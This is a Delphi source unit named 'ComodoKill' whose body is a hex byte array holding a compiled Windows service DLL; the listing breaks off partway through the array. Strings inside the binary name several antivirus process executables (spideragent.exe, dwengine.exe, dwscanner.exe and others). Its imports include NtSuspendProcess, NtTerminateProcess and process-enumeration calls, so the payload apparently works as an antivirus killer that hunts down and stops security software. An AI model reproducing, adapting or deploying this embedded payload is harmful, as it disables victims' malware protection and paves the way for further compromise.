{$E EXE}
{$IMAGEBASE $00410000}
{$R-}
{$Q-}
{$IFDEF minimum}
program vtest;
{$ENDIF}
unit ComodoKill;
interface

uses
  Windows,
  WinNative,
  RTL;

var
data: array[0..5119] of byte = (
	$4D, $5A, $90, $00, $03, $00, $00, $00, $04, $00, $00, $00, $FF, $FF, $00, $00, 
	$B8, $00, $00, $00, $00, $00, $00, $00, $40, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $D8, $00, $00, $00, 
	$0E, $1F, $BA, $0E, $00, $B4, $09, $CD, $21, $B8, $01, $4C, $CD, $21, $54, $68, 
	$69, $73, $20, $70, $72, $6F, $67, $72, $61, $6D, $20, $63, $61, $6E, $6E, $6F, 
	$74, $20, $62, $65, $20, $72, $75, $6E, $20, $69, $6E, $20, $44, $4F, $53, $20, 
	$6D, $6F, $64, $65, $2E, $0D, $0D, $0A, $24, $00, $00, $00, $00, $00, $00, $00, 
	$12, $46, $1F, $E4, $56, $27, $71, $B7, $56, $27, $71, $B7, $56, $27, $71, $B7, 
	$56, $27, $70, $B7, $17, $27, $71, $B7, $5F, $5F, $E2, $B7, $5F, $27, $71, $B7, 
	$AA, $07, $63, $B7, $54, $27, $71, $B7, $56, $27, $71, $B7, $58, $27, $71, $B7, 
	$4D, $BA, $DF, $B7, $55, $27, $71, $B7, $4D, $BA, $EA, $B7, $57, $27, $71, $B7, 
	$4D, $BA, $EC, $B7, $57, $27, $71, $B7, $52, $69, $63, $68, $56, $27, $71, $B7, 
	$00, $00, $00, $00, $00, $00, $00, $00, $50, $45, $00, $00, $4C, $01, $05, $00, 
	$F8, $74, $AA, $50, $00, $00, $00, $00, $00, $00, $00, $00, $E0, $00, $02, $21, 
	$0B, $01, $0A, $00, $00, $04, $00, $00, $00, $0C, $00, $00, $00, $00, $00, $00, 
	$AC, $11, $00, $00, $00, $10, $00, $00, $00, $20, $00, $00, $00, $00, $00, $10, 
	$00, $10, $00, $00, $00, $02, $00, $00, $05, $00, $01, $00, $00, $00, $00, $00, 
	$05, $00, $01, $00, $00, $00, $00, $00, $00, $60, $00, $00, $00, $04, $00, $00, 
	$20, $AA, $00, $00, $02, $00, $40, $01, $00, $00, $10, $00, $00, $10, $00, $00, 
	$00, $00, $10, $00, $00, $10, $00, $00, $00, $00, $00, $00, $10, $00, $00, $00, 
	$80, $23, $00, $00, $46, $00, $00, $00, $D8, $21, $00, $00, $50, $00, $00, $00, 
	$00, $40, $00, $00, $B4, $01, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $50, $00, $00, $78, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $20, $00, $00, $3C, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$2E, $74, $65, $78, $74, $00, $00, $00, $B1, $02, $00, $00, $00, $10, $00, $00, 
	$00, $04, $00, $00, $00, $04, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $20, $00, $00, $60, $2E, $72, $64, $61, $74, $61, $00, $00, 
	$C6, $03, $00, $00, $00, $20, $00, $00, $00, $04, $00, $00, $00, $08, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $40, $00, $00, $40, 
	$2E, $64, $61, $74, $61, $00, $00, $00, $84, $02, $00, $00, $00, $30, $00, $00, 
	$00, $04, $00, $00, $00, $0C, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $40, $00, $00, $C0, $2E, $72, $73, $72, $63, $00, $00, $00, 
	$B4, $01, $00, $00, $00, $40, $00, $00, $00, $02, $00, $00, $00, $10, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $40, $00, $00, $40, 
	$2E, $72, $65, $6C, $6F, $63, $00, $00, $AA, $01, $00, $00, $00, $50, $00, $00, 
	$00, $02, $00, $00, $00, $12, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $40, $00, $00, $42, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$55, $8B, $EC, $8B, $45, $08, $48, $74, $0A, $83, $E8, $03, $74, $2A, $6A, $78, 
	$58, $EB, $27, $68, $60, $32, $00, $10, $FF, $35, $7C, $32, $00, $10, $C7, $05, 
	$64, $32, $00, $10, $03, $00, $00, $00, $FF, $15, $04, $20, $00, $10, $C7, $05, 
	$80, $32, $00, $10, $01, $00, $00, $00, $33, $C0, $5D, $C2, $10, $00, $55, $8B, 
	$EC, $81, $EC, $30, $02, $00, $00, $6A, $00, $6A, $02, $C7, $85, $D0, $FD, $FF, 
	$FF, $2C, $02, $00, $00, $FF, $15, $14, $20, $00, $10, $89, $45, $FC, $83, $F8, 
	$FF, $0F, $84, $AC, $00, $00, $00, $8D, $85, $D0, $FD, $FF, $FF, $50, $FF, $75, 
	$FC, $FF, $15, $20, $20, $00, $10, $85, $C0, $0F, $84, $8B, $00, $00, $00, $53, 
	$8B, $1D, $18, $20, $00, $10, $56, $57, $BE, $48, $32, $00, $10, $8D, $85, $F4, 
	$FD, $FF, $FF, $50, $FF, $36, $FF, $D3, $85, $C0, $74, $0D, $83, $C6, $04, $81, 
	$FE, $60, $32, $00, $10, $7C, $E6, $EB, $4A, $68, $58, $21, $00, $10, $8D, $85, 
	$F4, $FD, $FF, $FF, $50, $FF, $D3, $FF, $B5, $D8, $FD, $FF, $FF, $F7, $D8, $6A, 
	$00, $1B, $F6, $68, $FF, $FF, $1F, $00, $46, $FF, $15, $0C, $20, $00, $10, $8B, 
	$F8, $85, $FF, $74, $1E, $83, $FE, $01, $75, $09, $57, $FF, $15, $34, $20, $00, 
	$10, $EB, $09, $6A, $00, $57, $FF, $15, $30, $20, $00, $10, $57, $FF, $15, $10, 
	$20, $00, $10, $8D, $85, $D0, $FD, $FF, $FF, $50, $FF, $75, $FC, $FF, $15, $1C, 
	$20, $00, $10, $85, $C0, $75, $81, $5F, $5E, $5B, $FF, $75, $FC, $FF, $15, $10, 
	$20, $00, $10, $C9, $C3, $53, $33, $DB, $53, $68, $00, $10, $00, $10, $68, $C8, 
	$21, $00, $10, $FF, $15, $00, $20, $00, $10, $A3, $7C, $32, $00, $10, $3B, $C3, 
	$74, $76, $56, $8B, $35, $04, $20, $00, $10, $57, $BF, $60, $32, $00, $10, $57, 
	$50, $C7, $05, $60, $32, $00, $10, $20, $00, $00, $00, $C7, $05, $64, $32, $00, 
	$10, $04, $00, $00, $00, $C7, $05, $68, $32, $00, $10, $01, $00, $00, $00, $89, 
	$1D, $6C, $32, $00, $10, $89, $1D, $70, $32, $00, $10, $89, $1D, $74, $32, $00, 
	$10, $89, $1D, $78, $32, $00, $10, $FF, $D6, $EB, $10, $E8, $BE, $FE, $FF, $FF, 
	$68, $F4, $01, $00, $00, $FF, $15, $28, $20, $00, $10, $39, $1D, $80, $32, $00, 
	$10, $74, $E8, $57, $FF, $35, $7C, $32, $00, $10, $C7, $05, $64, $32, $00, $10, 
	$01, $00, $00, $00, $FF, $D6, $5F, $5E, $5B, $C2, $08, $00, $55, $8B, $EC, $FF, 
	$75, $08, $FF, $15, $24, $20, $00, $10, $33, $C0, $40, $5D, $C2, $0C, $00, $CC, 
	$53, $56, $8B, $44, $24, $18, $0B, $C0, $75, $18, $8B, $4C, $24, $14, $8B, $44, 
	$24, $10, $33, $D2, $F7, $F1, $8B, $D8, $8B, $44, $24, $0C, $F7, $F1, $8B, $D3, 
	$EB, $41, $8B, $C8, $8B, $5C, $24, $14, $8B, $54, $24, $10, $8B, $44, $24, $0C, 
	$D1, $E9, $D1, $DB, $D1, $EA, $D1, $D8, $0B, $C9, $75, $F4, $F7, $F3, $8B, $F0, 
	$F7, $64, $24, $18, $8B, $C8, $8B, $44, $24, $14, $F7, $E6, $03, $D1, $72, $0E, 
	$3B, $54, $24, $10, $77, $08, $72, $07, $3B, $44, $24, $0C, $76, $01, $4E, $33, 
	$D2, $8B, $C6, $5E, $5B, $C2, $10, $00, $CC, $CC, $CC, $CC, $CC, $CC, $CC, $CC, 
	$53, $8B, $44, $24, $14, $0B, $C0, $75, $18, $8B, $4C, $24, $10, $8B, $44, $24, 
	$0C, $33, $D2, $F7, $F1, $8B, $44, $24, $08, $F7, $F1, $8B, $C2, $33, $D2, $EB, 
	$50, $8B, $C8, $8B, $5C, $24, $10, $8B, $54, $24, $0C, $8B, $44, $24, $08, $D1, 
	$E9, $D1, $DB, $D1, $EA, $D1, $D8, $0B, $C9, $75, $F4, $F7, $F3, $8B, $C8, $F7, 
	$64, $24, $14, $91, $F7, $64, $24, $10, $03, $D1, $72, $0E, $3B, $54, $24, $0C, 
	$77, $08, $72, $0E, $3B, $44, $24, $08, $76, $08, $2B, $44, $24, $10, $1B, $54, 
	$24, $14, $2B, $44, $24, $08, $1B, $54, $24, $0C, $F7, $DA, $F7, $D8, $83, $DA, 
	$00, $5B, $C2, $10, $00, $C3, $6A, $02, $E8, $F8, $FF, $FF, $FF, $83, $C4, $04, 
	$C3, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$32, $23, $00, $00, $52, $23, $00, $00, $00, $00, $00, $00, $98, $22, $00, $00, 
	$16, $23, $00, $00, $FA, $22, $00, $00, $EE, $22, $00, $00, $DC, $22, $00, $00, 
	$CA, $22, $00, $00, $AE, $22, $00, $00, $A6, $22, $00, $00, $00, $00, $00, $00, 
	$78, $22, $00, $00, $64, $22, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$28, $00, $6E, $00, $75, $00, $6C, $00, $6C, $00, $29, $00, $00, $00, $00, $00, 
	$28, $6E, $75, $6C, $6C, $29, $00, $00, $06, $00, $00, $06, $00, $01, $00, $00, 
	$10, $00, $03, $06, $00, $06, $02, $10, $04, $45, $45, $45, $05, $05, $05, $05, 
	$05, $35, $30, $00, $50, $00, $00, $00, $00, $20, $28, $38, $50, $58, $07, $08, 
	$00, $37, $30, $30, $57, $50, $07, $00, $00, $20, $20, $08, $00, $00, $00, $00, 
	$08, $60, $68, $60, $60, $60, $60, $00, $00, $70, $70, $78, $78, $78, $78, $08, 
	$07, $08, $00, $00, $07, $00, $08, $08, $08, $00, $00, $08, $00, $08, $00, $07, 
	$08, $00, $00, $00, $73, $00, $70, $00, $69, $00, $64, $00, $65, $00, $72, $00, 
	$61, $00, $67, $00, $65, $00, $6E, $00, $74, $00, $5F, $00, $61, $00, $64, $00, 
	$6D, $00, $2E, $00, $65, $00, $78, $00, $65, $00, $00, $00, $64, $00, $77, $00, 
	$6E, $00, $65, $00, $74, $00, $66, $00, $69, $00, $6C, $00, $74, $00, $65, $00, 
	$72, $00, $2E, $00, $65, $00, $78, $00, $65, $00, $00, $00, $64, $00, $77, $00, 
	$73, $00, $63, $00, $61, $00, $6E, $00, $6E, $00, $65, $00, $72, $00, $2E, $00, 
	$65, $00, $78, $00, $65, $00, $00, $00, $73, $00, $70, $00, $69, $00, $64, $00, 
	$65, $00, $72, $00, $61, $00, $67, $00, $65, $00, $6E, $00, $74, $00, $2E, $00, 
	$65, $00, $78, $00, $65, $00, $00, $00, $64, $00, $77, $00, $61, $00, $72, $00, 
	$6B, $00, $64, $00, $61, $00, $65, $00, $6D, $00, $6F, $00, $6E, $00, $2E, $00, 
	$65, $00, $78, $00, $65, $00, $00, $00, $64, $00, $77, $00, $65, $00, $6E, $00, 
	$67, $00, $69, $00, $6E, $00, $65, $00, $2E, $00, $65, $00, $78, $00, $65, $00, 
	$00, $00, $00, $00, $30, $00, $31, $00, $32, $00, $33, $00, $34, $00, $35, $00, 
	$36, $00, $37, $00, $38, $00, $39, $00, $41, $00, $42, $00, $43, $00, $44, $00, 
	$45, $00, $46, $00, $00, $00, $00, $00, $1F, $00, $00, $00, $1C, $00, $00, $00, 
	$1F, $00, $00, $00, $1E, $00, $00, $00, $1F, $00, $00, $00, $1E, $00, $00, $00, 
	$1F, $00, $00, $00, $1F, $00, $00, $00, $1E, $00, $00, $00, $1F, $00, $00, $00, 
	$1E, $00, $00, $00, $1F, $00, $00, $00, $68, $00, $65, $00, $6C, $00, $70, $00, 
	$73, $00, $76, $00, $63, $00, $00, $00, $58, $22, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $8E, $22, $00, $00, $30, $20, $00, $00, $34, $22, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $24, $23, $00, $00, $0C, $20, $00, $00, 
	$28, $22, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $66, $23, $00, $00, 
	$00, $20, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $32, $23, $00, $00, $52, $23, $00, $00, 
	$00, $00, $00, $00, $98, $22, $00, $00, $16, $23, $00, $00, $FA, $22, $00, $00, 
	$EE, $22, $00, $00, $DC, $22, $00, $00, $CA, $22, $00, $00, $AE, $22, $00, $00, 
	$A6, $22, $00, $00, $00, $00, $00, $00, $78, $22, $00, $00, $64, $22, $00, $00, 
	$00, $00, $00, $00, $12, $02, $4E, $74, $53, $75, $73, $70, $65, $6E, $64, $50, 
	$72, $6F, $63, $65, $73, $73, $00, $00, $16, $02, $4E, $74, $54, $65, $72, $6D, 
	$69, $6E, $61, $74, $65, $50, $72, $6F, $63, $65, $73, $73, $00, $00, $6E, $74, 
	$64, $6C, $6C, $2E, $64, $6C, $6C, $00, $80, $03, $4F, $70, $65, $6E, $50, $72, 
	$6F, $63, $65, $73, $73, $00, $B2, $04, $53, $6C, $65, $65, $70, $00, $DE, $00, 
	$44, $69, $73, $61, $62, $6C, $65, $54, $68, $72, $65, $61, $64, $4C, $69, $62, 
	$72, $61, $72, $79, $43, $61, $6C, $6C, $73, $00, $96, $03, $50, $72, $6F, $63, 
	$65, $73, $73, $33, $32, $46, $69, $72, $73, $74, $57, $00, $98, $03, $50, $72, 
	$6F, $63, $65, $73, $73, $33, $32, $4E, $65, $78, $74, $57, $00, $00, $45, $05, 
	$6C, $73, $74, $72, $63, $6D, $70, $69, $57, $00, $BE, $00, $43, $72, $65, $61, 
	$74, $65, $54, $6F, $6F, $6C, $68, $65, $6C, $70, $33, $32, $53, $6E, $61, $70, 
	$73, $68, $6F, $74, $00, $00, $52, $00, $43, $6C, $6F, $73, $65, $48, $61, $6E, 
	$64, $6C, $65, $00, $4B, $45, $52, $4E, $45, $4C, $33, $32, $2E, $64, $6C, $6C, 
	$00, $00, $87, $02, $52, $65, $67, $69, $73, $74, $65, $72, $53, $65, $72, $76, 
	$69, $63, $65, $43, $74, $72, $6C, $48, $61, $6E, $64, $6C, $65, $72, $45, $78, 
	$57, $00, $C0, $02, $53, $65, $74, $53, $65, $72, $76, $69, $63, $65, $53, $74, 
	$61, $74, $75, $73, $00, $00, $41, $44, $56, $41, $50, $49, $33, $32, $2E, $64, 
	$6C, $6C, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $F8, $74, $AA, $50, $00, $00, $00, $00, $B2, $23, $00, $00, 
	$01, $00, $00, $00, $01, $00, $00, $00, $01, $00, $00, $00, $A8, $23, $00, $00, 
	$AC, $23, $00, $00, $B0, $23, $00, $00, $15, $11, $00, $00, $BA, $23, $00, $00, 
	$00, $00, $64, $6C, $6C, $2E, $64, $6C, $6C, $00, $53, $65, $72, $76, $69, $63, 
	$65, $4D, $61, $69, $6E, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$01, $00, $00, $00, $2E, $00, $00, $00, $01, $00, $00, $00, $50, $20, $00, $10, 
	$40, $20, $00, $10, $00, $00, $00, $00, $A6, $12, $00, $10, $A6, $12, $00, $10, 
	$A6, $12, $00, $10, $A6, $12, $00, $10, $A6, $12, $00, $10, $A6, $12, $00, $10, 
	$3A, $30, $00, $10, $3A, $30, $00, $10, $00, $00, $20, $00, $20, $00, $20, $00, 
	$20, $00, $20, $00, $20, $00, $20, $00, $20, $00, $20, $00, $28, $00, $28, $00, 
	$28, $00, $28, $00, $28, $00, $20, $00, $20, $00, $20, $00, $20, $00, $20, $00, 
	$20, $00, $20, $00, $20, $00, $20, $00, $20, $00, $20, $00, $20, $00, $20, $00, 
	$20, $00, $20, $00, $20, $00, $20, $00, $20, $00, $48, $00, $10, $00, $10, $00, 
	$10, $00, $10, $00, $10, $00, $10, $00, $10, $00, $10, $00, $10, $00, $10, $00, 
	$10, $00, $10, $00, $10, $00, $10, $00, $10, $00, $84, $00, $84, $00, $84, $00, 
	$84, $00, $84, $00, $84, $00, $84, $00, $84, $00, $84, $00, $84, $00, $10, $00, 
	$10, $00, $10, $00, $10, $00, $10, $00, $10, $00, $10, $00, $81, $00, $81, $00, 
	$81, $00, $81, $00, $81, $00, $81, $00, $01, $00, $01, $00, $01, $00, $01, $00, 
	$01, $00, $01, $00, $01, $00, $01, $00, $01, $00, $01, $00, $01, $00, $01, $00, 
	$01, $00, $01, $00, $01, $00, $01, $00, $01, $00, $01, $00, $01, $00, $01, $00, 
	$10, $00, $10, $00, $10, $00, $10, $00, $10, $00, $10, $00, $82, $00, $82, $00, 
	$82, $00, $82, $00, $82, $00, $82, $00, $02, $00, $02, $00, $02, $00, $02, $00, 
	$02, $00, $02, $00, $02, $00, $02, $00, $02, $00, $02, $00, $02, $00, $02, $00, 
	$02, $00, $02, $00, $02, $00, $02, $00, $02, $00, $02, $00, $02, $00, $02, $00, 
	$10, $00, $10, $00, $10, $00, $10, $00, $20, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $75, $98, $00, $00, 
	$73, $98, $00, $00, $00, $00, $00, $00, $58, $21, $00, $10, $38, $21, $00, $10, 
	$18, $21, $00, $10, $FC, $20, $00, $10, $DC, $20, $00, $10, $B4, $20, $00, $10, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, 
	$00, $00, $00, $00, $00, $00, $00, $00, $04, $00, $00, $00, $00, $00, $01, $00, 
	$18, $00, $00, $00, $18, $00, $00, $80, $00, $00, $00, $00, $00, $00, $00, $00, 
	$04, $00, $00, $00, $00, $00, $01, $00, $02, $00, $00, $00, $30, $00, $00, $80, 
	$00, $00, $00, $00, $00, $00, $00, $00, $04, $00, $00, $00, $00, $00, $01, $00, 
	$09, $04, $00, $00, $48, $00, $00, $00, $58, $40, $00, $00, $5A, $01, $00, $00, 
	$E4, $04, $00, $00, $00, $00, $00, $00, $3C, $61, $73, $73, $65, $6D, $62, $6C, 
	$79, $20, $78, $6D, $6C, $6E, $73, $3D, $22, $75, $72, $6E, $3A, $73, $63, $68, 
	$65, $6D, $61, $73, $2D, $6D, $69, $63, $72, $6F, $73, $6F, $66, $74, $2D, $63, 
	$6F, $6D, $3A, $61, $73, $6D, $2E, $76, $31, $22, $20, $6D, $61, $6E, $69, $66, 
	$65, $73, $74, $56, $65, $72, $73, $69, $6F, $6E, $3D, $22, $31, $2E, $30, $22, 
	$3E, $0D, $0A, $20, $20, $3C, $74, $72, $75, $73, $74, $49, $6E, $66, $6F, $20, 
	$78, $6D, $6C, $6E, $73, $3D, $22, $75, $72, $6E, $3A, $73, $63, $68, $65, $6D, 
	$61, $73, $2D, $6D, $69, $63, $72, $6F, $73, $6F, $66, $74, $2D, $63, $6F, $6D, 
	$3A, $61, $73, $6D, $2E, $76, $33, $22, $3E, $0D, $0A, $20, $20, $20, $20, $3C, 
	$73, $65, $63, $75, $72, $69, $74, $79, $3E, $0D, $0A, $20, $20, $20, $20, $20, 
	$20, $3C, $72, $65, $71, $75, $65, $73, $74, $65, $64, $50, $72, $69, $76, $69, 
	$6C, $65, $67, $65, $73, $3E, $0D, $0A, $20, $20, $20, $20, $20, $20, $20, $20, 
	$3C, $72, $65, $71, $75, $65, $73, $74, $65, $64, $45, $78, $65, $63, $75, $74, 
	$69, $6F, $6E, $4C, $65, $76, $65, $6C, $20, $6C, $65, $76, $65, $6C, $3D, $22, 
	$61, $73, $49, $6E, $76, $6F, $6B, $65, $72, $22, $20, $75, $69, $41, $63, $63, 
	$65, $73, $73, $3D, $22, $66, $61, $6C, $73, $65, $22, $3E, $3C, $2F, $72, $65, 
	$71, $75, $65, $73, $74, $65, $64, $45, $78, $65, $63, $75, $74, $69, $6F, $6E, 
	$4C, $65, $76, $65, $6C, $3E, $0D, $0A, $20, $20, $20, $20, $20, $20, $3C, $2F, 
	$72, $65, $71, $75, $65, $73, $74, $65, $64, $50, $72, $69, $76, $69, $6C, $65, 
